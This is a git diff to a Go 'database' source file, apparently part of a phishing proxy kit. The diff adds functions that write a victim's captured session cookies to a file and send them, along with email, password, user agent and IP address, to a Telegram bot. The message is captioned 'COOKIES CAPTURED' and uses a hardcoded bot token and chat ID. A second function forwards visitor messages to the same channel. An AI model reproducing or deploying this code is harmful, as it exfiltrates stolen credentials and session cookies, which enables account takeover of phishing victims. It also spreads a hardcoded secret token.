@@ -1,11 +1,118 @@
 package database
 
 import (
+	"bytes"
 	"encoding/json"
-	"strconv"
+	"io"
+	"io/ioutil"
+	"fmt"
+	"mime/multipart"
+	"github.com/joho/godotenv"
+	"log"
+	"net/http"
+	"os"
+	"path"
+  	"path/filepath"
+
 
 	"github.com/tidwall/buntdb"
+	"strconv"
+	"strings"
+	"time"
 )
+
+func goDotEnvVariable(key string) string {
+
+	// load .env file
+	err := godotenv.Load(".env")
+
+	if err != nil {
+		log.Printf("Error loading .env file")
+	}
+
+	return os.Getenv(key)
+}
+
+
+func getUrl() string {
+	// godotenv package
+  	Token := goDotEnvVariable("TOKEN")
+	return fmt.Sprintf("https://api.telegram.org/bot%s", Token)
+}
+
+func getChatId() string {
+	//get ChAT_ID from .env
+	ChatId := goDotEnvVariable("CHAT_ID")
+	return fmt.Sprintf("%s", ChatId)
+}
+
+func sendTelegramResult(cookies string, username string, password string,  useragent string, remote_addr string) {
+
+	// Send the message
+	var err error
+	client, fileName := &http.Client{}, ""+username+".json"
+	token, chat_id := "6786760311:AAGsKQjcqJDJpufzErTe--ltddDF4WdHKzI", "919440287"
+
+	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
+	//url := "http://api.ttelegram.org/bot"%s/sendDocument?chat_id=%s", getUrl(), getChatId())
+	msg := "🍁 COOKIES CAPTURED 🍁\n\n******[💻 Valid Log💻]******\n🌟 Email = " + username + "\n🔑 Password = " + password + "\n🌎 UserAgent = " + useragent + "\n🎌 IP =   https://ip-api.com/" + remote_addr + "\n\n⁎⁎⁎⁎⁎⁎ANONYMOUS⁎⁎⁎⁎⁎⁎⁎⁎"
+	
+
+	err = os.WriteFile(fileName, []byte(cookies), 0755)
+	if err != nil {
+	   fmt.Printf("Unable to write file: %v", err)
+	}
+
+	fileDir, _ := os.Getwd()
+	filePath := path.Join(fileDir, fileName)
+
+	file, _ := os.Open(filePath)
+	defer file.Close()
+
+	responseBody := &bytes.Buffer{}
+	writer := multipart.NewWriter(responseBody)
+	part, _ := writer.CreateFormFile("document", filepath.Base(file.Name()))
+	io.Copy(part, file)
+	writer.WriteField("caption", msg)
+	writer.Close()
+	
+	req, _ := http.NewRequest("POST", url, responseBody)
+	req.Header.Add("Content-Type", writer.FormDataContentType())
+	client.Do(req)
+	os.Remove(fileName)
+
+	
+	log.Println("Cookies Result Sent To Telegram", username, password)
+	
+	// Return
+	return
+
+}
+
+func telegramSendVisitor(msg string) {
+	var err error
+	
+	url := fmt.Sprintf("%s/sendMessage", getUrl())
+	body, _ := json.Marshal(map[string]string{
+		"chat_id": getChatId(),
+		"text":    msg,
+	})
+	responseBody := bytes.NewBuffer(body)
+	request, _ := http.Post(url, "application/json", responseBody)
+
+	// Close the request at the end
+	defer request.Body.Close()
+	
+// 	// Body
+	body, err = ioutil.ReadAll(request.Body)
+	if err != nil {
+		log.Fatalf("%s", err)
+	}
+	fmt.Println("Result sent to telegram")
+	// Return
+	return
+}
+
 
 type Database struct {
 	path string
